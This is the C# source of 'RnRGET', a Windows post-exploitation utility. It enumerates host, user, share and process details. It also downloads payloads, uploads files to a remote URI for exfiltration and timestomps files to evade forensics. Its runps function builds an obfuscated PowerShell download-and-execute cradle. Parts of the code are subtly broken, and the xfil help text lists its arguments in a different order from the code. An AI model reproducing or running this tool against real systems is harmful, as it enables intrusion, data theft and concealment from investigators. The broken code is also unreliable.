using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Management;
using System.ComponentModel;
using System.Collections;
using System.Security.Principal;
using System.Net;
using System.IO.Compression;
using System.Text.RegularExpressions;

namespace rnr
{
    class get
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("                                                     __     ");
                Console.WriteLine("                                                    /  |    ");
                Console.WriteLine("  ______   _______    ______    ______    ______   _$$ |_   ");
                Console.WriteLine(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
                Console.WriteLine("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
                Console.WriteLine("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
                Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
                Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
                Console.WriteLine("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
                Console.WriteLine("                              /  \\__$$ |                    ");
                Console.WriteLine("                              $$    $$/                     ");
                Console.WriteLine("                               $$$$$$/                      ");
                Console.WriteLine("\nlittle recon never hurt nobody......");
                Console.WriteLine("\nRnRGET - post exploit commandline utility by james haughom jr\n");
                help();
                return;
            }
            // populate the variables from the arguments
            for (int i = 0; i < args.Length; i++)
            {
                try
                {
                    args[i].ToString();
                }
                catch
                {
                    // Display error if input is missing or invalid
                    Console.WriteLine(Environment.NewLine + "Invalid Input" +
                    Environment.NewLine);
                    Console.ReadLine();
                    return;
                }
            }
            if (args[0] == "help" || args[0] == "?" || args[0] == "/?")
            {
                Console.WriteLine("");
                help();
            }
            else if (args[0] == "hostinfo")
            {
                hostinfo();
            }
            else if (args[0] == "userinfo")
            {
                userinfo();
            }
            else if (args[0] == "shares")
            {
                shares();
            }
            else if (args[0] == "ps")
            {
                ps();
            }
            else if (args[0] == "envar")
            {
                envar();
            }
            else if (args[0] == "dld")
            {
                dld(args[1], args[2]);
            }
            else if (args[0] == "cat")
            {
                cat(args[1]);
            } 
            else if (args[0] == "xfil")
            {
                xfil(args[1], args[2]);
            }
            else if (args[0] == "ts")
            {
                ts(args[1]);
            }
            else if (args[0] == "mv")
            {
                mv(args[1], args[2]);
            }
            else if (args[0] == "cp")
            {
                cp(args[1], args[2]);
            }
            else if (args[0] == "del")
            {
                del(args[1]);
            }
            else if (args[0] == "grep")
            {
                grep(args[1], args[2]);
            }
            else if (args[0] == "enumdir")
            {
                enumdir(args[1]);
            }
            else if (args[0] == "run")
            {
                run(args[1]);
            }
            else if (args[0] == "mkdir")
            {
                mkdir(args[1]);
            }
            else if (args[0]  == "runadmin")
            {
                runadmin(args[1]);
            }
            else if (args[0] == "dldstr")
            {
                dldstr(args[1]);
            }
            else if (args[0] == "runps")
            {
                runps(args[1]);
            }
            else
            {
                Console.WriteLine("\nCommand/Argument not recognized.......\n");
                help();
            }
            return;
        }
        static void hostinfo()
        {
            string hostName = Dns.GetHostName();
            string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
            Console.Write("IP: {0}", ip);
            Console.Write("\nHostname: {0}", System.Environment.MachineName);
            Console.Write("\nMAC: ");
            string Query2 = "SELECT * FROM win32_networkadapterconfiguration";
            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(Query2);
            var mac = "";
            foreach (ManagementObject nic in searcher2.Get())
            {
                mac += Convert.ToString(nic.Properties["MACAddress"].Value);
                if (mac.Length <= 17 && mac.Length != 0)
                {
                    Console.Write("\n{0}", mac);
                }

            }
            Console.Write("\nProcessor Count: {0}", System.Environment.ProcessorCount);
            Console.Write("\n64-bit: {0}", System.Environment.Is64BitOperatingSystem);
            Console.Write("\nLogical Drive: {0}", Environment.GetLogicalDrives());
            string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
            UInt64 Capacity = 0;
            foreach (ManagementObject WniPART in searcher.Get())
            {
                Capacity += Convert.ToUInt64(WniPART.Properties["Capacity"].Value);
            }
            Console.Write("\nTotal RAM: {0}", Capacity);
            // add disk size
            // add OS version
        }
        static void userinfo()
        {
            Console.Write("Username: {0}", Environment.UserName);
            Console.Write("\nDomain\\Username: {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                Console.Write("\nAdmin: " + admin);
            }
        }
        static void shares()
        {
            var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
            var wql = "select * FROM Win32_Share";
            var searcher = new ManagementObjectSearcher(wmiPath, wql);
            var shares = searcher.Get();
            Console.Write("\nShares:");
            foreach (var share in shares)
            {
                Console.Write("\n{0}", share);
            }
            var wql2 = "select * FROM Win32_MappedLogicalDisk";
            var searcher2 = new ManagementObjectSearcher(wmiPath, wql2);
            var netShares = searcher2.Get();
            if (netShares is null)
            {
                Console.Write("\nNo Mapped Drives!");
            }
            else
            {
                Console.Write("\nMapped Drives:\n");
                foreach (var share2 in netShares)
                {
                    Console.Write("\n{0}");
                }
            }
        }
        static void ps()
        {
            StringBuilder allProcesses = new StringBuilder();
            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
            Process[] processList = Process.GetProcesses();
            foreach (Process process in processList)
            {
                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
                allProcesses.Append(processInfo);
            }
            Console.Write(allProcesses.ToString());
        }
        static void envar()
        {
            var envar = Environment.GetEnvironmentVariables();
            foreach (DictionaryEntry i in envar)
            {
                Console.WriteLine("{0}: {1}", i.Key, i.Value);
            }
        }
        static void dld(string path, string uri)
        {
            var wc = new System.Net.WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            Uri u = new Uri(uri);
            wc.DownloadFile(u, path);
        }
        static void cat(string path)
        {
            Console.Write(System.IO.File.ReadAllText(path));
        }
        static void xfil(string path, string uri)
        {
            var wc = new System.Net.WebClient();
            Uri u = new Uri(uri);
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            wc.UploadFile(u, path);
        }
        static void ts(string path)
        {
            System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
            System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
            System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
        }
        static void mv(string src, string dest)
        {
            System.IO.File.Move(src, dest);
        }
        static void cp(string src, string dest)
        {
            System.IO.File.Copy(src, dest);
        }
        static void del(string path)
        {
            System.IO.File.Delete(path);
        }
        static void grep(string pattern, string path)
        {
            var lines = System.IO.File.ReadLines(path);
            foreach (string line in lines)
            {
                if (line.Contains(pattern))
                {
                    Console.WriteLine(line);
                }
            }
        }
        static void enumdir(string path)
        {
            var files = System.IO.Directory.EnumerateFiles(path);
            var f = "";
            foreach (string file in files)
            {
                f += "\n" + file;
            }
            var directories = System.IO.Directory.EnumerateDirectories(path);
            foreach (string directory in directories)
            {
                f += "\n" + directory;
            }
            var list = f.Split();
            List<string> result = f.Split('\n').ToList();
            result.Sort();
            foreach (var item in result)
            {
                Console.WriteLine(item);
            }
        }
        static void run(string proc)
        {
            Process.Start(proc);
        }
        static void mkdir(string dir)
        {
            System.IO.Directory.CreateDirectory(dir);
        }
        private static bool runadmin(string proc)
        {
            var SelfProc = new ProcessStartInfo
            {
                UseShellExecute = true,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = proc,
                Verb = "runas",
         };
            try
            {
                Process.Start(SelfProc);
                return true;
            }
            catch
            {
                Console.WriteLine("Insufficient privs.....");
                return false;
            }
        }
        static void runps(string uri)
        {
            string s1 = "powershell.exe -noexit $asfkjas = (n`E`w-o`Bje`Ct \"n`eT.w`Ebcl`i`EnT\");$lkjd = $asfkjas.\"d`O`wnL`oa`dSTr`iNG\"(\"";
            string s2 = "\");$erl = ${env:ProgramFiles(x86)}[12] + ${env:ProgramFiles(x86)}[14] + ${env:ProgramFiles(x86)}[18];.$erl $lkjd";
            string payload = s1 + uri + s2;
            Console.Write(payload);
            string formatted = "\"\"\"" + payload + "\"\"\"";
            /*
            Process.Start(@"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", formatted);
            */
            Console.WriteLine(formatted);
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            startInfo.Arguments = payload;
            Process.Start(formatted);
            
        }
        static void dldstr(string uri)
        {
            var wc = new System.Net.WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            Uri u = new Uri(uri);
            string payload = wc.DownloadString(u);
        }
        static void help()
        {
            Console.WriteLine("Command      Description                 Format");
            Console.WriteLine("-------      -----------                 ------");
            Console.WriteLine("help         display help menu           rnrget.exe help, rnrget.exe /?, rnrget.exe ?");
            Console.WriteLine("cp           copy files                  rnrget.exe cp <source path> <destination path>, rnrget.exe cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
            Console.WriteLine("del          delete files                rnrget.exe del <target path>, rnrget.exe del C:\\Users\\Admin\\targetfile.txt");
            Console.WriteLine("dld          download payloads           rnrget.exe dld <download path> <URI>, rnrget.exe dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
            Console.WriteLine("enumdir      enumerate files             rnrget.exe enumdir <target dir>, rnrget.exe enumdir C:\\Users\\Admin\\Desktop");
            Console.WriteLine("grep         case sensisitive grep       rnrget.exe grep <pattern> <path>, rnrget.exe grep foo bar.txt");
            Console.WriteLine("hostinfo     get host information        rnrget.exe hostinfo");
            Console.WriteLine("mv           move files                  rnrget.exe mv <source> <destination>, rnrget.exe mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
            Console.WriteLine("mkdir        create directory            rnrget.exe mkdir <target dir>, rnrget.exe mkdir C:\\Users\\Admin\\NewDir");
            Console.WriteLine("ps           get process listing         rnrget.exe ps");
            Console.WriteLine("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt");
            Console.WriteLine("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe");
            Console.WriteLine("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe");
            Console.WriteLine("shares       enumerate shares            rnrget.exe shares");
            Console.WriteLine("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
            Console.WriteLine("userinfo     get user information        rnrget.exe userinfo");
            Console.WriteLine("xfil         exfil files                 rnrget.exe xfil <URI> <target path>, rnrget.exe xfil https://raw.githubusercontent.com/rnranalysis/xfiol.file C:\\Users\\Admin\\xfil.me");
            Console.WriteLine("");
        }
    }
}
